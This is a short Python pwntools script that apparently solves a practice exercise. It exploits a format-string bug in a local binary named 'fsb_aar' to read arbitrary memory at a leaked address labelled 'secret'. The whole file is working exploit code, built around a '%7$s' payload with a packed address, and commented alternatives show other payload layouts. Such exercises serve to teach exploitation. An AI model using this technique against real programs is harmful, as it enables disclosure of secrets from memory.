#!/usr/bin/python3
# Name: fsb_aar.py

from pwn import *

p = process("./fsb_aar")
p.recvuntil("`secret`: ")

addr_secret = int(p.recvline()[:-1], 16)

fstring = b"%7$s".ljust(8)
# fstring = b"%7$s" + b"\x00" * 0x4
fstring += p64(addr_secret)

# fstring = p64(addr_secret)
# fstring += b"%6$s".ljust(8)

p.sendline(fstring)
p.interactive()
